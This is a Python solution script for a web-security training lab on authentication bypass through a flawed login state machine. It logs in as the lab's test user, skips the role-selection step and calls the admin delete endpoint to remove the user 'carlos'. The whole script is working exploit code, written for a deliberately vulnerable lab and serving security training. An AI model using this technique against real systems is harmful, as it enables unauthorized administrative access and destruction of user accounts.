#######################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 28/10/2023
#
# Lab: Authentication bypass via flawed state machine
#
# Steps: 1. Fetch the login page
#        2. Extract the csrf token and session cookie to login
#        3. Login as wiener
#        4. Delete carlos from the admin panel directly without selecting a role
#
#######################################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0af80010045e60d8805a35cb001600e6.web-security-academy.net"

try:  
    # fetch the login page
    login_page = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = login_page.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as wiener
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # delete carlos directly since you have the session cookie and didn't select a role
    # you don't have to fetch the admin panel first 
    # when you don't select a role, the default will be an administrator
    requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to delete carlos through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Deleting carlos from the admin panel directly without selecting a role.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


